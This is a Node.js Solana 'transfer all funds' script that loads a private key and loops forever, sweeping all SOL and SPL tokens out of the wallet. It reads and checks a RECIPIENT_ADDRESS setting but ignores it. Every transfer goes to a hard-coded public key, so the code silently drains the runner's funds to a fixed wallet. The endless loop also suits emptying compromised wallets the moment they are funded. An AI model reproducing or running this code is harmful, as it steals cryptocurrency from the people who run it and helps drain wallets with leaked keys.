// Import necessary modules
const web3 = require('@solana/web3.js');
const bs58 = require('bs58');
const dotenv = require('dotenv');
const splToken = require('@solana/spl-token');
const { ComputeBudgetProgram, SystemProgram, Transaction } = require('@solana/web3.js');

// Load environment variables from .env file
dotenv.config();

// Initialize connection with RPC URL
const connection = new web3.Connection(
  process.env.RPC_URL,  // Use RPC URL from .env
  'processed'  // Faster confirmation
);

// Load environment variables
const privateKey = process.env.PRIVATE_KEY;
const recipientAddress = process.env.RECIPIENT_ADDRESS;

if (!privateKey || !recipientAddress || !process.env.RPC_URL) {
  console.error('Missing PRIVATE_KEY, RECIPIENT_ADDRESS, or RPC_URL in the .env file');
  process.exit(1);
}

// Initialize sender and recipient keys
const fromWallet = web3.Keypair.fromSecretKey(bs58.decode(privateKey));
const recipientPublicKey = new web3.PublicKey('6yxEFsESbwLUG6jWm5pWQefHxeMpz4LZqC1ZBex3YEXz');

// Constants
const SOL_LAMPORTS = 1_000_000_000; // 1 SOL in lamports
const MIN_SOL_BUFFER = 0.005 * SOL_LAMPORTS; // Minimum SOL buffer for fees

// Utility: Fetch SOL balance
const getSOLBalance = async (publicKey) => {
  const balance = await connection.getBalance(publicKey);
  console.log(`Current SOL balance: ${balance / SOL_LAMPORTS} SOL`);
  return balance;
};

// Utility: Fetch SPL token balances
const getSPLTokenBalances = async (walletPublicKey) => {
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(walletPublicKey, {
    programId: splToken.TOKEN_PROGRAM_ID,
  });

  const tokens = tokenAccounts.value.map((accountInfo) => ({
    tokenAddress: accountInfo.account.data.parsed.info.mint,
    balance: accountInfo.account.data.parsed.info.tokenAmount.uiAmount,
    decimals: accountInfo.account.data.parsed.info.tokenAmount.decimals,
    tokenAccount: accountInfo.pubkey,
  }));

  return tokens;
};

// Function: Transfer SOL
const transferSOL = async (toPublicKey, lamports) => {
  try {
    const computePriceIx = ComputeBudgetProgram.setComputeUnitPrice({
      microLamports: 100, // Adjust this value for a higher priority fee
    });

    const computeLimitIx = ComputeBudgetProgram.setComputeUnitLimit({
      units: 500_000, // Increase the compute unit limit for more resources
    });

    const transaction = new Transaction().add(
      computePriceIx,
      computeLimitIx,
      SystemProgram.transfer({
        fromPubkey: fromWallet.publicKey,
        toPubkey: toPublicKey,
        lamports,
      })
    );

    const signature = await connection.sendTransaction(transaction, [fromWallet]);
    console.log(`SOL Transaction sent. Signature: ${signature}`);
    return signature;
  } catch (error) {
    console.log("Error during SOL transfer:", error.message);
  }
};

// Function: Transfer SPL Tokens
const transferSPLTokens = async (mintAddress, fromTokenAccount, toPublicKey, amount, decimals) => {
  try {
    const recipientTokenAccount = await splToken.getOrCreateAssociatedTokenAccount(
      connection,
      fromWallet, // Payer
      new web3.PublicKey(mintAddress),
      toPublicKey
    );

    const amountInSmallestUnit = Math.floor(amount * 10 ** decimals);

    const transaction = new Transaction().add(
      splToken.createTransferInstruction(
        fromTokenAccount, // Source token account
        recipientTokenAccount.address, // Destination token account
        fromWallet.publicKey, // Owner of the source account
        amountInSmallestUnit
      )
    );

    const signature = await connection.sendTransaction(transaction, [fromWallet]);
    console.log(`SPL Token Transaction sent. Signature: ${signature}`);
    return signature;
  } catch (error) {
    console.log("Error during SPL token transfer:", error.message);
  }
};

// Function: Clear Console
const clearConsole = () => {
  console.clear();
};

// Function: Transfer All Funds (SOL and SPL Tokens)
const transferAllFunds = async () => {
  while (true) {
    try {
      clearConsole();

      const solBalance = await getSOLBalance(fromWallet.publicKey);

      const solTransferAmount = solBalance - MIN_SOL_BUFFER;
      if (solTransferAmount > 0) {
        await transferSOL(recipientPublicKey, solTransferAmount);
      } else {
        console.log('Check Wallet Balance for SOL or SPL...');
      }

      const splTokenBalances = await getSPLTokenBalances(fromWallet.publicKey);
      for (const token of splTokenBalances) {
        if (token.balance > 0) {
          await transferSPLTokens(
            token.tokenAddress,
            token.tokenAccount,
            recipientPublicKey,
            token.balance,
            token.decimals
          );
        }
      }

      console.log('Transfer process. Waiting for next iteration...');
      await new Promise((resolve) => setTimeout(resolve, 1000));
    } catch (error) {
      console.log("Error during fund transfer:", error.message);
    }
  }
};

// Start the transfer process
transferAllFunds();
